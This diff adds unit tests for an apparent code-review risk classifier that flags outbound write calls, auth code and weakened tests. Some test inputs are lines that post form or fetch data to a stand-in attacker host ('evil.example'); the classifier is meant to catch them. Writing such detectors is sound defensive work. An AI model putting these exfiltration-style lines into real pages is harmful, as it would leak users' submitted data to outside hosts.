@@ -443,3 +443,96 @@ test('a deleted source file without removal calls gets no removal-code reason', 
   const r = riskTier(file('app/util.py', { deleted: true, del: ['def f():', '    return 1'] }));
   assert.ok(!r.reasons.some(x => /removes files|deletes files/.test(x)), r.reasons.join('; '));
 });
+
+const outcome = (p, opts) => { const diff = file(p, opts); return riskTier(diff, { readFile: addedAsHead(diff) }); };
+
+test('a form that posts to the app itself is not an outbound call', () => {
+  for (const line of ['<form method="post" action="{{ base }}/dealer/channels">', '<div><form class="x" method=post action="/logout"><button>Log ud</button></form></div>', '<form method="POST">',
+    '<form method="post" action="{{ crate::b() }}/dealer/location" class="inline"{% if back == "welcome" %} hx-post="{{ crate::b() }}/dealer/location" hx-trigger="change" hx-swap="none"{% endif %}>']) {
+    const r = outcome('templates/channels.html', { add: [line] });
+    assert.equal(r.tier, 1, `${line}: ${r.reasons.join('; ')}`);
+  }
+});
+
+test('a same-origin fetch with a write method is not an outbound call', () => {
+  for (const line of ["fetch('/x', {method:'POST'})", 'await fetch(`/items/${id}/vote`, { method: "DELETE" });', 'fetch("./save", {method: \'PUT\', body})']) {
+    const r = outcome('static/app.js', { add: [line] });
+    assert.equal(r.tier, 1, `${line}: ${r.reasons.join('; ')}`);
+  }
+});
+
+test('a server-side or absolute write call is still an outbound call', () => {
+  for (const [p, line] of [
+    ['app/notify.py', 'requests.post("https://api.example.com/x", json=body)'],
+    ['app/notify.py', 'httpx.put(url)'],
+    ['server/hook.mjs', "await fetch('https://api.example.com/x', {method:'POST'})"],
+    ['server/hook.mjs', "await fetch('//api.example.com/x', {method:'POST'})"],
+    ['server/hook.mjs', "await fetch(url, {method:'POST'})"],
+    ['server/hook.mjs', "  method: 'POST',"],
+    ['templates/pay.html', '<form method="post" action="https://pay.example.com/charge">'],
+    ['templates/pay.html', '<form method="post" action="/x"></form><script>fetch(u, {method:"POST"})</script>'],
+    ['static/app.js', "fetch('/x', {method:'POST'}); requests.post(u)"],
+    ['static/app.js', "fetch('/x', {method:'POST'}); fetch(u, {method:'PUT'})"],
+    ['templates/pay.html', `<form action="/x" onsubmit="fetch('https://evil.example', {method:'POST'})">`],
+    ['templates/pay.html', '<form method="post" action=" https://pay.example.com/charge">'],
+    ['templates/pay.html', '<form method="post" action="\t//pay.example.com/charge">'],
+    ['static/app.js', 'fetch(`/${host}/x`, {method:"POST"})'],
+    ['server/api/charge.post.ts', "await $fetch('/v1/charges', { baseURL: 'https://api.stripe.com', method: 'POST', body })"],
+    ['server/billing.mjs', "await stripe.fetch('/v1/charges', { method: 'POST', body })"],
+    ['server/billing.mjs', "const res = await api.fetch('/hooks/notify', { method: 'DELETE' })"],
+    ['static/app.js', "fetch('/\t/evil.example/x', {method:'POST'})"],
+    ['static/app.js', "fetch('/ /evil.example/x', {method:'POST'})"],
+    ['static/app.js', "fetch('/x', {method:'POST', baseURL: 'https://api.example.com'})"],
+    ['templates/pay.jsx', '<form method="post" action={"https://pay.example.com/charge"}>'],
+    ['templates/pay.jsx', '<form method="post" onSubmit={e => track(e)} action="https://pay.example.com/charge">'],
+    ['templates/pay.html', '<form method="post" data-x="a>b" action="https://pay.example.com/charge">'],
+    ['templates/pay.html', '<form method="post"><button formaction="https://evil.example/x">'],
+    ['templates/pay.html', `<form onsubmit="$.ajax({url:'https://evil.example', method:'POST'}); return false">`],
+    ['templates/pay.html', '<form method="post" action="javascript:go()">'],
+    ['templates/pay.html', '<form method="post" action=https://pay.example.com/charge>'],
+    ['templates/pay.html', '<form method="post" hx-on:submit="send()" action="/x">'],
+    ['templates/pay.html', '<form method="post" action="/x" hx-post="https://evil.example/x">'],
+    ['templates/pay.vue', '<form method="post" :action="url">'],
+  ]) {
+    const r = outcome(p, { add: [line] });
+    assert.ok(r.reasons.includes(`outbound call with side effects: ${p}`), `${line}: ${r.reasons.join('; ')}`);
+  }
+});
+
+test('a test file named after auth is not auth code', () => {
+  for (const p of ['crates/app/tests/shared_setup_and_login.rs', 'tests/test_login.py', 'web/session.test.ts']) {
+    const r = outcome(p, { add: ['assert_eq!(a, b);'] });
+    assert.equal(r.tier, 1, `${p}: ${r.reasons.join('; ')}`);
+  }
+});
+
+test('a test removed or weakened in a test file named after auth is still tier 2', () => {
+  assert.equal(tier(file('tests/test_login.py', { del: ['def test_login_rejects_bad_password():', '    assert not ok'] })), 2);
+  assert.equal(tier(file('crates/app/tests/login.rs', { del: ['    assert_eq!(status, 403);'] })), 2);
+  assert.equal(tier(file('tests/test_auth.py', { deleted: true, del: ['x = 1'] })), 2);
+  assert.equal(tier(file('tests/test_auth.py', { add: ['@pytest.mark.skip'] })), 2);
+  assert.equal(tier(file('tests/test_auth.py', { del: ['    assert r.status_code == 403'], add: ['    assert r.status_code in (200, 403)'] })), 2);
+  assert.equal(tier(file('login_test.go', { del: ['func TestLoginRejectsBadPassword(t *testing.T) {', '\tif ok { t.Fatal("accepted") }', '}'] })), 2);
+  assert.equal(tier(file('tests/login.rs', { del: ['#[tokio::test(flavor = "multi_thread")]', 'async fn rejects_bad_password() {', '    assert!(!ok);', '}'] })), 2);
+  assert.equal(tier(file('tests/session.rs', { del: ['#[sqlx::test]', 'async fn expires(pool: PgPool) {', '    check(pool).await;', '}'] })), 2);
+  assert.equal(tier(file('web/auth.test.ts', { del: ['test.each(cases)("rejects %s", c => {', '  expect(login(c)).toBe(false);', '  expect(audit(c)).toBe(1);', '});'], add: ['expect(login(cases[0])).toBe(false);'] })), 2);
+});
+
+test('an auth-named test file that only drops a literal list item and adds tests stays tier 1', () => {
+  const r = outcome('crates/app/tests/shared_setup_and_login.rs', { del: ['    "/admin/analytics",'], add: ['    "/admin/plan",', '#[tokio::test]', 'async fn plan_page() { assert!(ok); }'] });
+  assert.equal(r.tier, 1, r.reasons.join('; '));
+});
+
+test('a huge line of unclosed form tags is classified quickly', () => {
+  const line = 'method="post" ' + ('<form a=' + 'x'.repeat(50)).repeat(20000);
+  const started = Date.now();
+  outcome('templates/big.html', { add: [line] });
+  assert.ok(Date.now() - started < 2000, `${Date.now() - started} ms`);
+});
+
+test('a file named like a test but not counted as a test keeps the auth rule', () => {
+  for (const p of ['app/login.test.py', 'app/auth_test_helpers.py', 'tests/auth_fixture.json']) {
+    const r = outcome(p, { add: ['x = 1'], del: ['def test_login(): pass'] });
+    assert.ok(r.reasons.includes(`auth or secrets code: ${p}`), `${p}: ${r.reasons.join('; ')}`);
+  }
+});
